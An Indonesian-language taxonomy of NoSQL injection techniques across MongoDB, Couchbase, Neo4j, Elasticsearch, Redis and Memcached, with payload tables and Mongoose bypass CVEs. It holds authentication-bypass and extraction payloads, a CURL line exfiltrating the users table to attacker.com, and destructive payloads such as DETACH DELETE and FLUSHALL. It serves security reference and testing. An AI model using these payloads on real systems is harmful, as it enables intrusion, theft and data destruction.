---
title: Nosql Injection
description: Vektor mutasi injeksi NoSQL dan taksonomi bypass filter
---

## Struktur Klasifikasi

Taksonomi ini mengorganisasikan seluruh permukaan serangan injeksi NoSQL berdasarkan tiga sumbu yang saling tegak lurus. **Sumbu 1 (Target Mutasi)** mendefinisikan *komponen struktural apa* dari interaksi database yang dimanipulasi — ini adalah sumbu utama dan menjadi kerangka isi dokumen. **Sumbu 2 (Mekanisme Eksploitasi)** mendeskripsikan *bagaimana* mutasi mencapai efeknya — sifat ketidakcocokan, kebingungan, atau bypass yang membuat injeksi berhasil. **Sumbu 3 (Hasil Serangan)** memetakan *di mana* setiap teknik digunakan — skenario dampak nyata di dunia.

Injeksi NoSQL berbeda secara fundamental dari injeksi SQL klasik karena tidak ada satu bahasa query tunggal yang menjadi target. Sebaliknya, permukaan serangan terfragmentasi di berbagai mesin database (MongoDB, CouchDB, Couchbase, Neo4j, Redis, Elasticsearch, DynamoDB), berbagai antarmuka query (operator berbasis dokumen, JavaScript sisi server, aggregation pipeline, bahasa query mirip SQL, bahasa query graph, perintah key-value), dan berbagai saluran pengiriman input (body JSON, parameter URL-encoded, header HTTP, GraphQL resolver). Fragmentasi ini berarti "injeksi NoSQL" bukanlah satu kelas kerentanan, melainkan *keluarga* primitif injeksi yang disatukan oleh targetnya: data store non-relasional.

Mekanisme Sumbu 2 yang berlaku lintas semua kategori adalah:

| Mekanisme | Deskripsi |
|-----------|-----------|
| **Type Confusion** | Mengubah nilai skalar (string) menjadi objek atau array, menyebabkan query engine menafsirkannya sebagai ekspresi operator |
| **Operator Hijack** | Menyuntikkan operator query yang tidak diinginkan (`$ne`, `$gt`, `$regex`, dll.) ke dalam query yang dirancang menerima nilai biasa |
| **Syntax Escape** | Keluar dari konteks string atau nilai untuk menyuntikkan logika query tambahan, analog dengan pelolosan tanda kutip pada injeksi SQL |
| **Validation Bypass** | Menghindari lapisan sanitasi (filter ODM, middleware, aturan WAF) melalui nesting, encoding, atau manipulasi struktural |
| **Authorization Bypass** | Mengakses data atau operasi di luar cakupan yang dimaksud melalui manipulasi query (pembacaan lintas koleksi, eskalasi hak istimewa) |

---

## §1. Injeksi Operator Query

Injeksi operator query adalah bentuk injeksi NoSQL yang paling umum dan khas. Ini mengeksploitasi fakta bahwa banyak database NoSQL (khususnya MongoDB) menerima objek terstruktur sebagai parameter query, di mana kunci khusus yang diawali `$` ditafsirkan sebagai operator query, bukan nilai literal. Ketika aplikasi meneruskan input yang dikontrol pengguna langsung ke dalam query tanpa validasi tipe, penyerang dapat mengganti nilai skalar dengan ekspresi operator.

### §1-1. Injeksi Operator Perbandingan

Bentuk injeksi NoSQL yang paling sederhana dan umum. Penyerang mengganti nilai string yang diharapkan dengan objek operator perbandingan untuk mengubah logika query.

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **$ne (Not Equal)** | Mengembalikan semua dokumen di mana field tidak sama dengan nilai yang ditentukan. Ketika disuntikkan ke field username dan password, mengembalikan dokumen pertama dalam koleksi. | `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}` | Aplikasi meneruskan objek mentah ke query tanpa pemeriksaan tipe |
| **$gt / $lt (Greater/Less Than)** | Perbandingan terhadap string kosong atau nol mencocokkan semua nilai yang tidak kosong, melewati pemeriksaan nilai tertentu. | `{"username":{"$gt":""},"password":{"$gt":""}}` | Perbandingan numerik atau leksikografis bermakna untuk field target |
| **$gte / $lte (Batas Rentang)** | Membatasi hasil pada rentang nilai, memungkinkan ekstraksi tertarget saat dikombinasikan dengan enumerasi. | `{"username":{"$gte":"admin","$lte":"admin"},"password":{"$gte":""}}` | Digunakan untuk mempersempit ekstraksi blind ke rekaman tertentu |
| **$in / $nin (Keanggotaan Himpunan)** | `$in` cocok dengan nilai apa pun dalam array yang diberikan; `$nin` mengecualikan nilai. Berguna untuk menarget akun tertentu atau mengenumerasi nilai yang valid. | `{"username":{"$in":["admin","administrator","root"]},"password":{"$ne":""}}` | Aplikasi menerima nilai array dalam posisi operator |
| **$exists (Keberadaan Field)** | Mencocokkan dokumen berdasarkan ada tidaknya suatu field, berguna untuk menyelidiki skema dan melewati pemeriksaan field opsional. | `{"resetToken":{"$exists":true},"email":"admin@example.com"}` | Field target mungkin ada atau tidak ada di berbagai dokumen |

### §1-2. Injeksi Operator Regular Expression

Operator `$regex` memungkinkan pencocokan pola terhadap nilai field. Ketika disuntikkan, ia mengubah query pencocokan tepat menjadi query berbasis pola, memungkinkan bypass maupun ekstraksi data.

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **Wildcard Match** | `^.*` cocok dengan nilai apa pun, mengubah pemeriksaan pencocokan tepat menjadi lolos universal. | `{"username":"admin","password":{"$regex":"^.*"}}` | Aplikasi tidak memaksakan tipe pada parameter password |
| **Prefix Extraction** | Pengujian karakter berurutan melalui `^a`, `^ab`, `^abc` secara bertahap mengungkap nilai field karakter demi karakter. | `{"username":"admin","password":{"$regex":"^s3cr"}}` | Respons yang dapat dibedakan secara boolean (status HTTP, body, atau timing berbeda) |
| **Length Probing** | Pola `.{N}` menentukan panjang tepat nilai field sebelum ekstraksi. | `{"password":{"$regex":".{8}"}}` → true; `{"password":{"$regex":".{9}"}}` → false | Respons berbeda antara cocok dan tidak cocok |
| **Character Class Enumeration** | Menguji keberadaan tipe karakter (digit, karakter khusus) untuk mempersempit ruang pencarian. | `{"password":{"$regex":"\\d"}}` (mengandung digit?) | Mengurangi ruang brute-force untuk ekstraksi prefix berikutnya |
| **Case-Insensitive Matching** | Flag `$options: "i"` memungkinkan pencocokan case-insensitive untuk enumerasi username. | `{"username":{"$regex":"^admin","$options":"i"}}` | Perbandingan username case-sensitive tetapi penyerang tidak mengetahui huruf besar/kecil yang tepat |

### §1-3. Injeksi Operator Logika

Operator logika (`$or`, `$and`, `$not`, `$nor`) mengubah struktur boolean query. Ketika disuntikkan, mereka dapat menambahkan kondisi alternatif yang selalu bernilai true atau digabungkan dengan operator lain untuk rantai bypass yang kompleks.

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **$or Always-True** | Menambahkan kondisi alternatif yang mencocokkan semua dokumen, membuat seluruh predikat benar tanpa memperhatikan klausa lain. | `{"$or":[{"username":"admin"},{"username":{"$ne":""}}]}` | Aplikasi tidak memvalidasi kunci query tingkat atas |
| **$or Filter Nesting** | Menumpuk operator berbahaya (misalnya `$where`) di dalam array `$or` untuk melewati pemeriksaan sanitasi yang hanya berlaku di tingkat atas. | `{"$or":[{"$where":"sleep(5000)"}]}` | Sanitizer hanya memeriksa kunci tingkat atas (pola CVE-2025-23061) |
| **$not Inversion** | Membalik kondisi untuk mencocokkan semua kecuali pola yang ditentukan. | `{"password":{"$not":{"$eq":"wrongpassword"}}}` | Lebih jarang difilter dibandingkan `$ne` |

### §1-4. Injeksi Operator Evaluasi

Operator evaluasi mengeksekusi ekspresi atau kode di dalam mesin database, memberikan primitif injeksi yang paling kuat.

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **$where JavaScript** | Mengeksekusi ekspresi JavaScript arbitrer di server. Dijelaskan lebih lanjut di §3. | `{"$where":"this.username=='admin' && this.password.startsWith('a')"}` | `$where` tidak dinonaktifkan; JS sisi server diaktifkan |
| **$expr Aggregation Expression** | Mengevaluasi ekspresi agregasi dalam query find, memungkinkan perbandingan lintas-field dan kondisi komputasi. | `{"$expr":{"$eq":["$password","$username"]}}` | Lebih jarang dibatasi dibandingkan `$where` |

---

## §2. Injeksi Sintaks Query

Injeksi sintaks terjadi ketika input pengguna digabungkan langsung ke dalam string query atau template, memungkinkan penyerang keluar dari konteks nilai yang dimaksud dan menyuntikkan logika query tambahan. Ini sejajar dengan injeksi SQL klasik dan berlaku terutama untuk database atau driver yang membangun query melalui concatenation string.

### §2-1. Pelolosan Batas String

Ketika query dibangun dengan menginterpolasi input pengguna ke dalam template string, karakter khusus dapat mengakhiri string dan menyuntikkan logika baru.

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **Quote Escape (Single)** | Mengakhiri nilai string yang dikutip tunggal dan menambahkan logika always-true. | Input: `admin' \|\| '1'=='1` → Query menjadi: `this.username == 'admin' \|\| '1'=='1'` | Query dibangun melalui concatenation string dengan tanda kutip tunggal |
| **Quote Escape (Double)** | Prinsip yang sama dengan konteks kutip ganda. | Input: `admin" \|\| "1"=="1` | Interpolasi string kutip ganda |
| **Comment Injection** | Menggunakan sintaks komentar JavaScript atau bahasa query untuk membuang sisa konteks yang disuntikkan. | Input: `admin'; return true; //` | Konteks JavaScript sisi server ($where atau eval) |
| **Null Byte Truncation** | Karakter `%00` memotong pemrosesan string di beberapa parser, membuang batasan query berikutnya. | `username=admin%00&password=anything` | Bahasa/parser backend rentan terhadap terminasi null byte |

### §2-2. Manipulasi Logika Boolean

Setelah keluar dari konteks nilai, penyerang menyuntikkan kondisi yang mengubah evaluasi boolean keseluruhan query.

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **Always-True Injection** | Menambahkan `\|\| true` atau yang setara untuk membuat query mencocokkan semua dokumen. | `' \|\| '1'=='1` atau `' \|\| true \|\| '` | Ekspresi yang disuntikkan dievaluasi dalam konteks boolean |
| **Always-False dengan UNION** | Memaksa kondisi asli menjadi false, lalu menyuntikkan union/alternatif untuk mengontrol data yang dikembalikan. | `' && 0 && 'x` (verifikasi) vs. `' && 1 && 'x` (konfirmasi) | Digunakan untuk deteksi — respons diferensial mengkonfirmasi injeksi |
| **Conditional Truth** | Menyuntikkan kondisi yang benar hanya untuk rekaman tertentu, memungkinkan akses data yang ditargetkan. | `admin' && this.password.length > 5 && 'a'=='a` | Konteks JS sisi server dengan akses properti objek |

### §2-3. Deteksi Fuzz String

Pengujian sistematis dengan karakter khusus mengidentifikasi parameter yang dapat disuntikkan dengan memicu kesalahan sintaks atau perubahan perilaku.

| Fuzz String | Tujuan |
|-------------|--------|
| `'"\`{ ;$Foo} $Foo \xYZ` | Fuzz string dasar MongoDB yang menguji beberapa vektor pelolosan secara bersamaan |
| `'` (tanda kutip tunggal) | Menguji pelolosan batas string |
| `$ne` / `$gt` dalam parameter URL | Menguji interpretasi operator dari input URL-encoded |
| `{"$gt":""}` dalam body JSON | Menguji injeksi operator dalam konteks JSON |

---

## §3. Injeksi JavaScript Sisi Server (SSJI)

MongoDB mendukung eksekusi JavaScript dalam beberapa konteks: operator query `$where`, operator agregasi `$function` dan `$accumulator`, serta perintah `mapReduce` (yang sudah tidak direkomendasikan). Ketika input pengguna mencapai salah satu konteks ini tanpa sanitasi, penyerang dapat mengeksekusi JavaScript arbitrer di server database.

### §3-1. Injeksi Klausa $where

Operator `$where` menerima ekspresi atau fungsi JavaScript yang dievaluasi untuk setiap dokumen. Ia menyediakan akses ke dokumen melalui `this` dan ke seluruh runtime JavaScript.

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **Conditional Data Extraction** | JavaScript yang mengakses `this.fieldName` mengekstrak nilai karakter demi karakter melalui oracle boolean atau timing. | `admin' && this.password[0] == 'a' \|\| 'a'=='b` | Respons yang dapat dibedakan secara boolean |
| **Regex-Based Extraction** | `this.field.match()` menguji pola kompleks dalam konteks JavaScript. | `admin' && this.password.match(/^[a-f]/) \|\| 'a'=='b` | Lebih efisien dibandingkan ekstraksi per karakter |
| **Sleep-Based Timing Oracle** | `sleep()` memperkenalkan penundaan yang dapat diukur berdasarkan nilai data, memungkinkan ekstraksi blind saat respons identik. | `{"$where":"if(this.password[0]=='a'){sleep(5000)}"}` | Perbedaan timing dapat terdeteksi melalui jaringan |
| **Conditional Timing Function** | Fungsi JavaScript khusus dengan busy-wait loop untuk kontrol timing yang lebih presisi. | `admin'+function(x){var w=new Date(new Date().getTime()+5000);while((x.password[0]==='a')&&w>new Date()){}}(this)+'` | Eksekusi JS sisi server diaktifkan |
| **Error-Based Exfiltration** | `throw new Error()` dengan `JSON.stringify(this)` membuang konten dokumen ke dalam pesan error. | `{"$where":"throw new Error(JSON.stringify(this))"}` | Aplikasi mengembalikan pesan error terperinci (mode debug) |
| **Object.keys() Enumeration** | Mengekstrak nama field dari dokumen tanpa pengetahuan skema sebelumnya. | `{"$where":"Object.keys(this)[0].match('^.{0}a.*')"}` | Digunakan saat nama field tidak diketahui |

### §3-2. Injeksi $function / $accumulator

Tersedia di MongoDB 4.4+, operator agregasi `$function` dan `$accumulator` mengeksekusi JavaScript dalam aggregation pipeline.

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **$function Code Execution** | Mengeksekusi JavaScript arbitrer dalam tahap agregasi, dengan akses ke field dokumen. | `{"$function":{"body":"function(x){return x}","args":["$password"],"lang":"js"}}` | Input pengguna mencapai definisi aggregation pipeline |
| **$accumulator State Manipulation** | Fungsi akumulator JavaScript khusus dengan tahap init, accumulate, merge, dan finalize. | Suntikkan ke dalam `accumulateArgs` atau `body` dari `$accumulator` | Injeksi aggregation pipeline (§4) sebagai prasyarat |

### §3-3. Injeksi mapReduce (Legacy)

Perintah `mapReduce` (tidak direkomendasikan sejak MongoDB 5.0) menerima fungsi JavaScript `map` dan `reduce`. Pada deployment lama, input pengguna yang mencapai fungsi-fungsi ini memungkinkan eksekusi kode arbitrer.

| Subtipe | Mekanisme | Kondisi Kunci |
|---------|-----------|---------------|
| **Map Function Injection** | JavaScript arbitrer dalam fungsi `map` memiliki akses ke setiap dokumen melalui `this`. | Aplikasi mengekspos parameter mapReduce ke input pengguna |
| **Reduce Function Injection** | JavaScript arbitrer dalam fungsi `reduce` memproses hasil yang dikelompokkan. | Deployment MongoDB lama dengan mapReduce diaktifkan |

---

## §4. Injeksi Aggregation Pipeline

Framework agregasi MongoDB menyediakan pipeline pemrosesan data multi-tahap yang kuat. Ketika input pengguna dapat mempengaruhi definisi tahap pipeline, penyerang mendapatkan kemampuan jauh melampaui manipulasi query sederhana — termasuk akses data lintas koleksi dan modifikasi data.

### §4-1. Akses Data Lintas Koleksi

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **$lookup (Left Outer Join)** | Membaca data dari koleksi mana pun dalam database yang sama dengan melakukan left outer join. Menggunakan nama field yang tidak ada untuk `localField` dan `foreignField` mengembalikan seluruh koleksi target. | `{"$lookup":{"from":"users","localField":"_nonexistent","foreignField":"_nonexistent","as":"leaked"}}` | Input pengguna mengontrol atau memperluas tahap aggregation pipeline |
| **$unionWith (Union Koleksi)** | Menggabungkan hasil dari pipeline saat ini dengan seluruh isi koleksi lain, mirip dengan SQL UNION ALL. | `{"$unionWith":{"coll":"users","pipeline":[{"$addFields":{"_src":"users"}}]}}` | Titik injeksi pipeline ada |
| **$lookup dengan Sub-Pipeline** | Ekstraksi lebih bertarget menggunakan sub-pipeline berfilter dalam `$lookup`. | `{"$lookup":{"from":"users","pipeline":[{"$match":{"role":"admin"}}],"as":"admins"}}` | Memungkinkan nesting pipeline |
| **$graphLookup (Rekursif)** | Melakukan pencarian rekursif di seluruh dokumen, berguna untuk menelusuri struktur data hierarkis. | `{"$graphLookup":{"from":"employees","startWith":"$managerId","connectFromField":"managerId","connectToField":"_id","as":"chain"}}` | Model data graph/hierarkis |

### §4-2. Modifikasi Data via Agregasi

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **$merge (Upsert ke Koleksi)** | Menulis hasil agregasi ke koleksi target, dengan opsi untuk insert, replace, merge, atau gagal saat cocok. | `{"$merge":{"into":"users","whenMatched":"merge","whenNotMatched":"insert"}}` | Injeksi aggregation pipeline; izin write |
| **$out (Ganti Koleksi)** | Mengganti seluruh koleksi dengan output dari aggregation pipeline. Lebih destruktif dibandingkan `$merge`. | `{"$out":"users"}` | Izin write; kemampuan destruktif |
| **$set + $merge (Modifikasi Field)** | Menggabungkan `$set` untuk memodifikasi field tertentu dengan `$merge` untuk menulis perubahan kembali, memungkinkan perusakan data yang ditargetkan. | `[{"$match":{"email":"admin@site.com"}},{"$set":{"role":"superadmin"}},{"$merge":{"into":"users","whenMatched":"merge"}}]` | Injeksi pipeline dengan izin write |

### §4-3. Penyalahgunaan Tahap Internal

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **$mergeCursors (Shard Bypass)** | Tahap internal untuk menggabungkan hasil query di seluruh shard. Penanganan otorisasi yang tidak tepat memungkinkan akses data tidak sah dengan melewati RBAC. | Pipeline yang dibuat khusus mengeksploitasi `$mergeCursors` | Deployment MongoDB tershard; CVE-2025-6713 |
| **Dummy $match Elimination** | `{"$match":{"_id":{"$exists":false}}}` mengembalikan nol hasil dari koleksi asli, memastikan hanya data lintas koleksi (melalui `$lookup`/`$unionWith`) yang dikembalikan. | Ditambahkan sebelum pipeline sebelum `$unionWith` | Digunakan untuk mengisolasi hasil lintas koleksi |
| **$replaceWith (Penggantian Dokumen)** | Menggantikan setiap dokumen dalam pipeline dengan dokumen yang ditentukan, memungkinkan injeksi konten arbitrer sebelum `$merge`. | `{"$replaceWith":{"_id":"targetId","password":"newpass"}}` | Diikuti oleh `$merge` untuk modifikasi data |

### §4-4. Indikator Deteksi Pipeline

Saat melakukan pengujian black-box, indikator berikut menunjukkan adanya injeksi aggregation pipeline:

- Parameter permintaan yang menerima array JSON (misalnya, `pipeline=[{...}]`)
- Kehadiran operator khusus agregasi dalam pesan error (`$match`, `$group`, `$project`)
- Respons yang berisi struktur dokumen bertumpuk dari beberapa koleksi
- Path endpoint yang mengandung `/aggregate` atau pola penamaan serupa

---

## §5. Injeksi Bahasa Query Khusus Database

Beberapa database NoSQL mengimplementasikan bahasa query mirip SQL atau bahasa khusus domain yang rentan terhadap injeksi melalui concatenation string, mencerminkan pola injeksi SQL klasik yang diadaptasi ke sintaks masing-masing bahasa.

### §5-1. Injeksi N1QL (Couchbase)

N1QL (diucapkan "nickel") memperluas SQL untuk dokumen JSON di Couchbase Server 4.0+. Injeksi mengikuti pola injeksi SQL tetapi dengan fungsi dan batasan spesifik Couchbase.

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **UNION-Based Extraction** | Menambahkan UNION SELECT dari keyspace sistem untuk mengekstrak metadata dan data dari bucket lain. | `city=' AND '1'='0' UNION SELECT * FROM system:keyspaces WHERE '1'='1` | Concatenation string ke dalam query N1QL |
| **Boolean-Based Blind** | Ekstraksi karakter demi karakter menggunakan fungsi `SUBSTR()` dan `ENCODE_JSON()`. | `city=X' AND '{' = SUBSTR(ENCODE_JSON((SELECT * FROM system:keyspaces ORDER BY id)),1,1) AND '1'='1` | Respons diferensial untuk kondisi true/false |
| **CURL-Based SSRF** | Fungsi `CURL()` N1QL (jika diaktifkan) membuat permintaan HTTP dari server database, memungkinkan SSRF. | `' UNION SELECT CURL('http://attacker.com/exfil?data=' \|\| ENCODE_JSON((SELECT * FROM users)))` | Fitur CURL diaktifkan dalam konfigurasi Couchbase |
| **System Keyspace Enumeration** | `system:keyspaces` dan `system:datastores` mengekspos metadata database untuk pengintaian. | `UNION SELECT * FROM system:keyspaces` | Akses ke endpoint N1QL |

**Batasan N1QL**: Stacking query tidak didukung. Hanya komentar blok C-style (`/* */`) yang tersedia — komentar baris (`--`) tidak ada. Keterbatasan ini memerlukan strategi eksploitasi yang berbeda dibandingkan injeksi SQL tradisional.

### §5-2. Injeksi Cypher (Neo4j)

Bahasa query Cypher Neo4j rentan terhadap injeksi ketika input pengguna digabungkan ke dalam string query.

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **Boolean Tautology** | Menyuntikkan kondisi always-true ke dalam klausa MATCH/WHERE. | `' OR 1=1 WITH true AS ignored MATCH (n) RETURN n //` | Concatenation string ke dalam query Cypher |
| **UNION-Based Extraction** | Menambahkan UNION MATCH untuk mengekstrak data dari tipe node lain. | `' UNION MATCH (n:SecretNode) RETURN n.data //` | Aplikasi mengembalikan hasil query ke klien |
| **Error-Based via Date()** | Menempatkan data yang diekstrak di dalam fungsi `Date()`, yang gagal dengan pesan error yang berisi data. | `' OR 1=1 WITH 1 as a CALL dbms.security.listUsers() YIELD username AS u RETURN Date(u) //` | Pesan error dikembalikan ke klien |
| **Destructive Operations** | Menyuntikkan `DETACH DELETE` untuk menghancurkan data graph. | `1 OR 1=1 WITH true AS ignored MATCH (all) DETACH DELETE all //` | Izin write; sangat berbahaya |
| **Label/Type Bypass** | Label node, tipe relasi, dan nama properti tidak dapat diparameterisasi dalam Cypher, memerlukan perlindungan berbasis sanitasi. | Label dinamis: `MATCH (n:` + userInput + `) RETURN n` | Konstruksi label/tipe dinamis dari input pengguna |

### §5-3. Injeksi CQL (Cassandra)

Cassandra Query Language (CQL) sangat menyerupai SQL, membuat serangan injeksi CQL secara struktural mirip dengan injeksi SQL.

| Subtipe | Mekanisme | Kondisi Kunci |
|---------|-----------|---------------|
| **String Escape** | Keluar dari literal string CQL untuk menyuntikkan klausa WHERE atau query UNION tambahan. | Query CQL dibangun melalui concatenation string |
| **ALLOW FILTERING Abuse** | Menyuntikkan `ALLOW FILTERING` untuk melewati batasan query yang biasanya mencegah full-table scan. | Query yang dibatasi yang dapat diperluas |

### §5-4. Injeksi Mango Query CouchDB

API query Mango CouchDB menerima objek selector JSON, membuatnya rentan terhadap pola injeksi operator yang mirip dengan MongoDB.

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **Selector Operator Injection** | Menyuntikkan `$ne`, `$regex`, `$or` ke dalam objek selector Mango. | `{"selector":{"username":{"$ne":null}}}` | Input pengguna mencapai selector Mango tanpa validasi tipe |
| **HTTP API Direct Access** | REST API CouchDB memungkinkan CRUD dokumen langsung; endpoint yang terekspos memungkinkan manipulasi data tanpa injeksi. | `PUT /db/doc_id` dengan dokumen yang dimodifikasi | API CouchDB terekspos tanpa autentikasi |

### §5-5. Injeksi Elasticsearch Query DSL

Query DSL berbasis JSON dari Elasticsearch dapat dieksploitasi ketika input pengguna diinterpolasi ke dalam template query.

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **Template Injection** | Template Mustache menggunakan `{{{...}}}` (tiga kurung kurawal) tidak meng-escape nilai, memungkinkan manipulasi struktur JSON. | `{{{userInput}}}` di mana input adalah `","query":{"match_all":{}},"_source":["password"],"foo":"` | Interpolasi template yang tidak di-escape |
| **Query DSL Manipulation** | Menyuntikkan klausa query tambahan melalui concatenation string dalam pembuat query. | JSON yang di-escape keluar dari `match` ke dalam `bool`/`should` | Query dibangun melalui interpolasi string |
| **Script Injection** | Skrip Painless Elasticsearch (atau Groovy yang sudah tidak direkomendasikan) dapat dieksploitasi untuk eksekusi kode. | `{"script":{"source":"Runtime.getRuntime().exec('cmd')"}}` | Skrip diaktifkan; input pengguna mencapai konteks skrip |

### §5-6. Injeksi Perintah Redis

Redis beroperasi pada protokol perintah daripada bahasa query, membuat injeksi berupa manipulasi perintah.

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **Command Chaining** | Menyuntikkan perintah Redis tambahan melalui karakter newline dalam parameter perintah. | `key\r\nFLUSHALL\r\n` | Input mencapai string perintah Redis tanpa sanitasi |
| **Lua Script Injection** | Perintah Redis EVAL mengeksekusi skrip Lua; injeksi memungkinkan eksekusi kode Lua arbitrer. | `EVAL "redis.call('SET','pwned','true')" 0` | Input pengguna mencapai argumen perintah EVAL |
| **SSRF via Gopher Protocol** | Menggabungkan kerentanan SSRF dengan protokol Redis untuk mengeksekusi perintah arbitrer dari jarak jauh. | `gopher://redis:6379/_*3%0d%0a$3%0d%0aSET%0d%0a...` | SSRF ada yang dapat menjangkau port Redis |

### §5-7. Injeksi Perintah Memcached

Memcached menggunakan protokol berbasis teks di mana perintah dibatasi oleh `\r\n`. Ketika library klien membangun perintah dengan menggabungkan input pengguna tanpa sanitasi, injeksi CRLF memungkinkan eksekusi perintah Memcached arbitrer.

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **CRLF Command Injection** | Menyuntikkan `\r\n` ke dalam kunci atau nilai cache untuk mengakhiri perintah saat ini dan menyuntikkan perintah Memcached tambahan (`set`, `delete`, `flush_all`). | `key\r\nset injected 0 3600 5\r\nPWNED\r\n` | Library klien tidak mensanitasi CRLF dalam parameter kunci/nilai |
| **Session/Cache Poisoning** | Menyuntikkan perintah `set` untuk menimpa data sesi atau entri cache aplikasi yang di-cache dengan nilai yang dikontrol penyerang, memungkinkan pembajakan sesi atau manipulasi logika. | `\r\nset session:victim 0 3600 <len>\r\n<forged_session>\r\n` | Aplikasi menggunakan Memcached untuk penyimpanan sesi; CRLF dapat disuntikkan |
| **CRC32 Collision Key Routing** | Dalam library yang menggunakan hashing CRC32 untuk consistent hashing di seluruh node Memcached (misalnya pylibmc), membuat kunci cache yang nilai CRC32-nya bertabrakan memungkinkan penargetan node Memcached tertentu. Dikombinasikan dengan injeksi CRLF, penyerang mengontrol node mana yang menerima perintah dan perintah apa yang dieksekusi. | Kunci yang dibuat untuk menghasilkan tabrakan CRC32 dengan rentang hash node target | Klien menggunakan consistent hashing berbasis CRC32 (pylibmc, libmemcached); kluster Memcached multi-node |

---

## §6. Manipulasi Saluran Pengiriman Input

Cara input pengguna disusun, di-encode, dan dikirimkan ke aplikasi sangat mempengaruhi apakah injeksi dapat dilakukan. Memanipulasi saluran input itu sendiri sering menjadi prasyarat untuk injeksi operator (§1).

### §6-1. Konversi Content-Type

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **URL-Encoded ke JSON** | Mengganti Content-Type dari `application/x-www-form-urlencoded` ke `application/json` untuk mengirim objek terstruktur di mana aplikasi mengharapkan string datar. | Ubah `username=admin&password=pass` menjadi `{"username":"admin","password":{"$ne":""}}` | Framework sisi server mengurai kedua tipe konten |
| **JSON ke URL-Encoded** | Kebalikannya: menggunakan sintaks array URL-encoded untuk menyuntikkan objek ketika aplikasi mengharapkan JSON. | `username=admin&password[$ne]=` | Parser `qs` Express/Node.js mengonversi notasi bracket ke objek |

### §6-2. Eksploitasi Format Parameter

| Subtipe | Mekanisme | Contoh Payload | Kondisi Kunci |
|---------|-----------|----------------|---------------|
| **Bracket Notation Array Injection** | Parser query bergaya Express menginterpretasikan `param[$op]=value` sebagai `{param: {$op: value}}`, mengubah parameter datar menjadi objek bertumpuk. | `password[$ne]=invalid&password[$regex]=^a` | Node.js dengan parser default `qs` atau `express` |
| **PHP Array Parameter** | PHP menginterpretasikan `param[key]=value` sebagai array asosiatif, memungkinkan injeksi operator dari parameter URL. | `password[$ne]=1` di PHP → `array('$ne' => '1')` | PHP dengan driver MongoDB |
| **Duplicate Key Processing** | MongoDB memproses kunci JSON duplikat dengan hanya mempertahankan kemunculan terakhir. Dapat digunakan untuk menimpa nilai yang telah disanitasi. | `{"password":"sanitized","password":{"$ne":""}}` | Parser menerima kunci duplikat; perilaku last-wins |
| **GraphQL Filter Passthrough** | GraphQL resolver yang meneruskan `args.filter` langsung ke `collection.find()` melewatkan objek operator melalui lapisan GraphQL. | Query GraphQL: `{ users(filter: {password: {$ne: ""}}) { email } }` | Resolver tidak memvalidasi/daftar putih struktur filter |

### §6-3. Encoding dan Obfuscation

| Subtipe | Mekanisme | Kondisi Kunci |
|---------|-----------|---------------|
| **Unicode Encoding** | Representasi alternatif dari karakter `$` dan `.` untuk menghindari sanitizer berbasis pola. | Sanitizer menggunakan pencocokan string sederhana daripada perbandingan setelah dekode |
| **URL Encoding** | `%24ne` untuk `$ne`, `%2e` untuk `.` untuk melewati filter yang memeriksa karakter literal. | Filter diterapkan sebelum URL decoding |
| **Double Encoding** | `%2524ne` mendekode ke `%24ne` pada pass pertama, lalu `$ne` pada pass kedua. | Beberapa lapisan decoding dalam pipeline permintaan |
| **JSON Unicode Escape** | `\u0024ne` dalam JSON mewakili `$ne` dan dapat melewati filter tingkat string sebelum penguraian JSON. | Filter memeriksa string JSON mentah sebelum deserialisasi |

---

## §7. Bypass Lapisan ODM/ORM dan Middleware

Object-Document Mapper (ODM seperti Mongoose) dan middleware sanitasi (seperti `express-mongo-sanitize`) dirancang untuk mencegah injeksi NoSQL. Namun, celah implementasi menciptakan peluang bypass.

### §7-1. Bypass Sanitasi Mongoose

| Subtipe | Mekanisme | Kondisi Kunci |
|---------|-----------|---------------|
| **$or Nesting Bypass** | `sanitizeFilter` Mongoose hanya memeriksa properti tingkat atas dari objek. Membungkus `$where` di dalam array `$or` melewati pemeriksaan karena sanitizer tidak berekursi ke dalam elemen array. Payload mencapai library `sift` untuk evaluasi, memungkinkan RCE. | Mongoose < 8.9.5; `populate().match()` dengan filter yang dikontrol pengguna (CVE-2025-23061) |
| **Incomplete Patch Iteration** | CVE-2025-23061 adalah perbaikan tidak lengkap untuk CVE-2024-53900. Perbaikan asli memblokir injeksi `$where` langsung tetapi tidak `$where` yang dinestingkan dalam `$or`. Pola bypass tambahan ini umum dalam lapisan sanitasi. | Mongoose 8.8.3–8.9.4 (perbaikan CVE pertama tapi bukan kedua) |
| **populate().match() Attack Surface** | Metode `populate()` Mongoose dengan parameter `match` meneruskan objek yang dikontrol pengguna ke dalam konstruksi query. Ini adalah permukaan injeksi yang kurang jelas dibandingkan panggilan `find()` langsung. | Aplikasi menggunakan `populate().match(userInput)` |

